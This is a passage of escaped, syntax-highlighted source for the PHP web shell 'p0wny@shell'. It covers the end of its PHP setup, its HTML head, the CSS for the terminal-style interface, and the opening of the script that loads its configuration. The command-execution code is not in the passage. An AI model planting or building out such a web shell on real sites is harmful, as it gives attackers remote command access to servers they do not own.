class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    initShellConfig();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026lt;html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u0026lt;meta charset=\u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003eUTF\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u0026lt;title\u0026gt;p0wny@shell:~#\u0026lt;/title\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u0026lt;meta name=\u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003eviewport\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34; content=\u0026#34;\u003c/span\u003e\u003cspan class=\"nx\"\u003ewidth\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003edevice\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003ewidth\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003einitial\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003escale\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mf\"\u003e1.0\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u0026lt;style\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            html, body {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                margin: 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                padding: 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                background: #333;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                color: #eee;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                font-family: monospace;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                width: 100vw;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                height: 100vh;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                overflow: hidden;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            *::-webkit-scrollbar-track {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                border-radius: 8px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                background-color: #353535;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            *::-webkit-scrollbar {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                width: 8px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                height: 8px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            *::-webkit-scrollbar-thumb {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                border-radius: 8px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                background-color: #bcbcbc;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            #shell {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                background: #222;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                font-size: 10pt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                display: flex;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                flex-direction: column;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                align-items: stretch;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                max-width: calc(100vw - 2 * var(--shell-margin));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                max-height: calc(100vh - 2 * var(--shell-margin));\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                resize: both;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                overflow: hidden;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                width: 100%;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                height: 100%;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                margin: var(--shell-margin) auto;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            #shell-content {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                overflow: auto;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                padding: 5px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                white-space: pre-wrap;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                flex-grow: 1;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            #shell-logo {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                font-weight: bold;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                color: #FF4180;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                text-align: center;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            :root {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                --shell-margin: 25px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            @media (min-width: 1200px) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                :root {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    --shell-margin: 50px !important;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            @media (max-width: 991px),\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                   (max-height: 600px) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                #shell-logo {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    font-size: 6px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    margin: -25px 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                :root {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    --shell-margin: 0 !important;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                #shell {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    resize: none;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            @media (max-width: 767px) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                #shell-input {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    flex-direction: column;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            @media (max-width: 320px) {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                #shell-logo {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                    font-size: 5px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            .shell-prompt {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                font-weight: bold;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                color: #75DF0B;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            .shell-prompt \u0026gt; span {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                color: #1BC9E7;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            #shell-input {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                display: flex;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                border-top: rgba(255, 255, 255, .05) solid 1px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                padding: 10px 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            #shell-input \u0026gt; label {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                flex-grow: 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                display: block;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                padding: 0 5px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                height: 30px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                line-height: 30px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            #shell-input #shell-cmd {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                height: 30px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                line-height: 30px;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                border: none;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                background: transparent;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                color: #eee;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                font-family: monospace;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                font-size: 10pt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                width: 100%;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                align-self: center;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                box-sizing: border-box;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            #shell-input div {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                flex-grow: 1;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                align-items: stretch;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            #shell-input input {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e                outline: none;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u0026lt;/style\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        \u0026lt;script\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            var SHELL_CONFIG = \u0026lt;?php echo json_encode(\u003c/span\u003e\u003cspan class=\"si\"\u003e$SHELL_CONFIG\u003c/span\u003e\u003cspan class=\"s2\"\u003e); ?\u0026gt;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e            var CWD = null;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 